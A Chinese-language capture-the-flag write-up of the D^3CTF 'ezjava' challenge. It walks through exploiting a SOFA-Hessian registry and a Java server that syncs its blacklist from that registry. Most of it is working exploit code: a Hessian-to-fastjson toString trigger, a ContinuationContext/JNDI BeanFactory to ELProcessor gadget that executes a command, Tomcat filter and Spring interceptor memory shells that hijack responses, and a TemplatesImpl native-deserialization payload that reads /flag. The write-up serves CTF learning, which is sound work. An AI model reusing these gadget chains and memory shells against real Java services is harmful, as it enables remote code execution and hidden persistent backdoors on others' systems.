# D^3CTF ezjava

附件👉[Click Me](../backup/d3ctf_java.zip)

这道题模拟了真实世界当中动态配置中心的架构——注册端存储相关配置，而服务端定期同步相关配置。而在这道题中的配置是Java原生反序列化的黑名单

## Registry Hessian Deser Vul

注册端存在Hessian反序列化漏洞，这里它用的不是原生的Hessian，而是蚂蚁金服魔改后的Sofa Hessian

SOFA-Hessian 基于原生 Hessian v4.0.51 进行改进，支持导入Hessian黑名单来防止常见的Hessian利用链。

```java
import com.alipay.hessian.ClassNameResolver;
import com.alipay.hessian.NameBlackListFilter;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.example.registry.data.Blacklist;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;

public class HessianSerializer {
    public HessianSerializer() {
    }

    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(bos);
        output.writeObject(obj);
        output.close();
        return bos.toByteArray();
    }

    public static Object deserialize(byte[] obj) throws Exception {
        ByteArrayInputStream is = new ByteArrayInputStream(obj);
        Hessian2Input input = new Hessian2Input(is);
        ClassNameResolver resolver = new ClassNameResolver();
        resolver.addFilter(new AntInternalNameBlackListFilter());
        input.getSerializerFactory().setClassNameResolver(resolver);
        return input.readObject();
    }

    static class AntInternalNameBlackListFilter extends NameBlackListFilter {
        public AntInternalNameBlackListFilter() {
            super(Blacklist.hessianBlackList);
        }
    }
}
```

`ClassNameResolver`可以添加过滤器，过滤器继承自`NameBlackListFilter`，黑名单为`resources/security/hessian_blacklist.txt`

(这两个类都是`com.alipay.hessian`下的)

题目存在fastjson2.0.24的依赖，刚好黑名单中没有过滤fastjson

考虑fastjson原生反序列化，现在的问题变成

* 怎么触发fastjson的`toString`
* 寻找Hessian黑名单之外的可利用的getter

### Getter without accessing the network

ysomap中存在这么一个利用类`javax.naming.spi.ContinuationContext#getTargetContext`

```java
protected Context getTargetContext() throws NamingException {
    if (contCtx == null) {
        if (cpe.getResolvedObj() == null)
            throw (NamingException)cpe.fillInStackTrace();

        contCtx = NamingManager.getContext(cpe.getResolvedObj(),
                                           cpe.getAltName(),
                                           cpe.getAltNameCtx(),
                                           env);
        if (contCtx == null)
            throw (NamingException)cpe.fillInStackTrace();
    }
    return contCtx;
}
```

`NamingManager.getContext`进去就是JNDI了

JNDI的8u191绕过提到了本地Class的利用

> 目前公开常用的利用方法是通过 **Tomcat** 的 **org.apache.naming.factory.BeanFactory** 工厂类去调用 **javax.el.ELProcessor#eval** 方法或 **groovy.lang.GroovyShell#evaluate** 方法
>
> `org.apache.naming.factory.BeanFactory` 在 `getObjectInstance()` 中会通过反射的方式实例化Reference所指向的Bean Class，并且能调用一些指定的方法
>
> 如何理解？
>
> Reference类是我们可控的，这个类指定了JNDI要加载的类名(resourceClass)和用于加载这个类的工厂类(factory)，在这里欲加载的类就是`ELProcessor`，工厂类为`BeanFactory`。之所以用这个工程类，

跟进`NamingManager#getContext`，进到了`NamingManager#getObjectInstance`

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment) {

    ObjectFactory factory;
    Object answer;

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }
    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively
            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            return refInfo;
        } // ... 
    }
    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

首先判断`refInfo`是否为`Reference`或`Referenceable`类型

接着根据`ref`获取工厂类，这里传进去的`factoryName`为`org.apache.naming.factory.BeanFactory`，`getObjectFactoryFromReference`会去加载并实例化这个类

接着调用返回的`factory`的`getObjectInstance`

![image-20230727195328229](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230727195328229.png)

首先判断当前ref是否为`ResourceRef`，接着获取`beanClass`，并用当前线程的类加载去加载，后面实例化这个类

![image-20230727200409090](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230727200409090.png)

`Introspector.getBeanInfo`获取类的基本信息，包括类标识符、属性(貌似只有对应getter、setter的属性才会获取)、方法

从ref中获取`addrType`为`forceString`的`RefAddr`，并创建了一个键为字符串，值为方法的`HashMap`

![image-20230727201508750](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230727201508750.png)

接着获取了`StringRefAddr`的内容，以逗号为分隔符分开为每一项，若该项中含有等于号`=`，则左边作为值，右边作为getter方法名，获取到对应`Method`后作为值，放入`forced`这个`HashMap`中

源代码的注释也写得很清楚了，每一项可能是name=method的形式，也可以只是一个属性名，这里会对属性名进行setter标准化。显然这里如果是前者，并没有检查method是否为形为getXxx的方法，比如这里为eval

![image-20230727202211112](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230727202211112.png)

获取ref的所有`RefAddr`并遍历，跳过`addrType`为`factory`、`scope`、`auth`、`forceString`、`singleton`的`RefAddr`

对于其他`RefAdrr`，获取其内容，并放入一个Object数组，只有一个元素且为String

到这里应该可以猜到了这个值会作为上面获取的setter方法的参数，接着就是激动人心的方法调用了

![image-20230727202752165](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230727202752165.png)

所以实际上这里可以调用任意对象的方法，方法需要满足参数只有一个且为String类型

不过由于无法修改对象的属性，挺难找到`ElProcessor`之外的利用类

```java
import org.apache.naming.ResourceRef;

import javax.naming.CannotProceedException;
import javax.naming.StringRefAddr;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Hashtable;

public class Test {
    public static Object newInstance(String cName, Class<?>[] paramTypes, Object... params) throws Exception {
        Class<?> aClass = Class.forName(cName);
        Constructor<?> c = aClass.getDeclaredConstructor(paramTypes);
        c.setAccessible(true);
        return c.newInstance(params);
    }
    public static void main(String[] args) throws Exception {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(ref);
        Object ctx = newInstance("javax.naming.spi.ContinuationContext",
                new Class[]{CannotProceedException.class, Hashtable.class},
                cpe, new Hashtable<>());
        Method method = Class.forName("javax.naming.spi.ContinuationContext").getDeclaredMethod("getTargetContext");
        method.setAccessible(true);
        method.invoke(ctx);
    }
}
```

### Hessian Exception triggering toString

和Dubbo中的类似，参考[见这](../Deserial/hessian_only_jdk.md)

![image-20230728005709554](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230728005709554.png)

```java
public static void ser(Object evil) throws Exception {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    Hessian2Output output = new Hessian2Output(baos); output.getSerializerFactory().setAllowNonSerializable(true);  //允许反序列化NonSerializable
    baos.write(77);
    output.writeObject(evil);
    output.flushBuffer();

    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
    Hessian2Input input = new Hessian2Input(bais);
    input.readObject();
}

JSONArray array = new JSONArray();
array.add(ctx);
ser(array);
```

## Server Java Native Deser Vul

flag在服务端，我们只能通过注册中心打服务端

同样服务端设置了一大堆黑名单，会同步注册中心的黑名单

访问注册中心的`/client/status`，其会请求服务端的`/status`，调用update更新黑名单，若返回的是List则直接更新`denyClasses`，若为字符串，则先进行反序列化后再更新

![image-20230728011146258](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230728011146258.png)

![image-20230728011408073](E:\MyBook\Java_Zoo\.gitbook\assets\image-20230728011408073.png)

`DefaultSerializer#deserialize`还会判断传入的`denyClasses`是否为空，若为空则读取原始的黑名单。

因此我们通过注入filter内存马来改写注册中心返回的黑名单为一些没用的数据，先清除服务端黑名单，然后再改写一次，让其返回恶意的序列化数据，让服务端对请求`/blacklist/jdk/get`返回的数据进行反序列化，打原生fastjson或jackson。

为了回显，同样需要改写服务端的返回包，注入filter来改写`/status`的返回数据为读取的flag

```java
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;

public class MemoryShell implements Filter {

    private static String uri;
    private static String filterName = "DefaultFilter";

    public MemoryShell(String uri) {
    }

    public MemoryShell() {
        try {
            System.out.println("try to inject");
            ThreadLocal threadLocal = init();

            if (threadLocal != null && threadLocal.get() != null) {
                System.out.println("try to inject to request");
                ServletRequest servletRequest = (ServletRequest) threadLocal.get();
                ServletContext servletContext = servletRequest.getServletContext();

                ApplicationContext applicationContext = (ApplicationContext) getFieldObject(servletContext, servletContext.getClass(), "context");

                StandardContext standardContext = (StandardContext) getFieldObject(applicationContext, applicationContext.getClass(), "context");
                Map filterConfigs = (Map) getFieldObject(standardContext, standardContext.getClass(), "filterConfigs");

                if (filterConfigs.get(filterName) != null) {
                    filterConfigs.remove(filterName); // 重新注册
                }

                MemoryShell filter = new MemoryShell(uri);

                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilterClass(filter.getClass().getName());
                filterDef.setFilter(filter);
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern(uri);
                filterMap.setFilterName(filterName);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(filterName, filterConfig);
                System.out.println("inject success");
            }
        } catch (Exception ignored) {}
    }

    public ThreadLocal init() throws Exception {
        Class<?> applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
        Field WRAP_SAME_OBJECT = getField(applicationDispatcher, "WRAP_SAME_OBJECT");
        Field modifiersField = getField(WRAP_SAME_OBJECT.getClass(), "modifiers");
        modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        if (!WRAP_SAME_OBJECT.getBoolean(null)) {
            WRAP_SAME_OBJECT.setBoolean(null, true);
        }

        //初始化 lastServicedRequest
        Class<?> applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        Field lastServicedRequest = getField(applicationFilterChain, "lastServicedRequest");
        modifiersField = getField(lastServicedRequest.getClass(), "modifiers");
        modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedRequest.get(null) == null) {
            lastServicedRequest.set(null, new ThreadLocal<>());
        }

        //初始化 lastServicedResponse
        Field lastServicedResponse = getField(applicationFilterChain, "lastServicedResponse");
        modifiersField = getField(lastServicedResponse.getClass(), "modifiers");
        modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedResponse.get(null) == null) {
            lastServicedResponse.set(null, new ThreadLocal<>());
        }

        return (ThreadLocal) getFieldObject(null, applicationFilterChain, "lastServicedRequest");
    }

    public static Object getFieldObject(Object obj, Class<?> cls, String fieldName) {
        Field field = getField(cls, fieldName);
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Field getField(Class<?> cls, String fieldName) {
        Field field = null;
        try {
            field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (cls.getSuperclass() != null)
                field = getField(cls.getSuperclass(), fieldName);
        }
        return field;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletResponse resp = (HttpServletResponse) response;
        String data = "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAHbm90aGluZ3g=";
        String retData = "{" +
                "\"message\": \"" + data + "\"," +
                "\"code\": \"200\"" +
                "}";
        resp.getWriter().write(retData);
        // 没有doFilter 不进控制器直接返回
    }
}
```

好吧，Filter内存马不好使，要打两次才行(或许是lastServicedResponse的原因?)，得加载两次字节码，类名还得不同，麻烦。

网上找了其他师傅写的Spring内存马，太好用了！orz

生成无效黑名单👇

```java
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class EmptyBlackList {
    public static void ser(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }

    public static void main(String[] args) throws Exception {
        List<String> list = new ArrayList<>();
        list.add("nothing");
        ser(list);
        // rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAHbm90aGluZ3g=
    }
}
```

fastjson打Server👇

```java
import com.alibaba.fastjson.JSONArray;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import javassist.ClassPool;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class ServerSideAttack {
    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get("RegistryInterceptor").toBytecode();

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{code});
        setValue(templates, "_name", "1");

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(val);

        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));
    }
}
```

RegistryInterceptor👇

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

public class RegistryInterceptor extends AbstractTranslet implements HandlerInterceptor {

    static {
        System.out.println("injection start");
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List<HandlerInterceptor> adaptInterceptors = null;
        try {
            adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        RegistryInterceptor evilInterceptor = new RegistryInterceptor();
        adaptInterceptors.add(evilInterceptor);
        System.out.println("injection end");
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String flag = new String(Files.readAllBytes(Paths.get("/flag")));
        String code = "{\"code\":\"200\",\"message\":\"" + flag + "\"}";
        if (request.getRequestURI().equals("/status")) {
            response.addHeader("Content-Type", "application/json;charset=UTF-8");
            response.getWriter().write(code);
            response.getWriter().flush();
            response.getWriter().close();
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

ServerInterceptor👇

```java
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class ServerInterceptor implements HandlerInterceptor {
    public static int nums = 1;

    static {
        System.out.println("injection start");
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List<HandlerInterceptor> adaptInterceptors = null;
        try {
            adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        ServerInterceptor evilInterceptor = new ServerInterceptor();
        adaptInterceptors.add(evilInterceptor);
        System.out.println("injection end");
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String code;
        if (nums % 2 == 0) {
            // Server Attack
            code = "{\"code\":\"200\",\"message\":" +
                    "\"\"}";
        } else {
            // Crash BlackList
            code = "{\"code\":\"200\",\"message\":" +
                    "\"rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAHbm90aGluZ3g=\"}";
        }
        if (request.getRequestURI().equals("/blacklist/jdk/get")) {
            String result = new Scanner(code).useDelimiter("\\A").next();
            response.addHeader("Content-Type", "application/json;charset=UTF-8");
            response.getWriter().write(result);
            response.getWriter().flush();
            response.getWriter().close();
            nums++;
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
```

访问三次`/client/status`即可得到flag

## Summary

* Registry存在Hessian反序列化漏洞，没有禁fastjson，通过构造畸形数据触发toString，最后调用`ContinuationContext#getTargetContext`触发JNDI加载本地Class，打EL表达式
* Registry植入内存马，修改返回体的数据，让Server请求到无效的黑名单
* 再次修改Registry返回包数据为恶意序列化数据，fastjson原生反序列化打Server
* Server植入内存马，修改返回体为flag数据

优雅~优雅！


## Reference

https://github.com/wh1t3p1g/ysomap

https://pupil857.github.io/2023/05/03/d3ctf-ezjava/
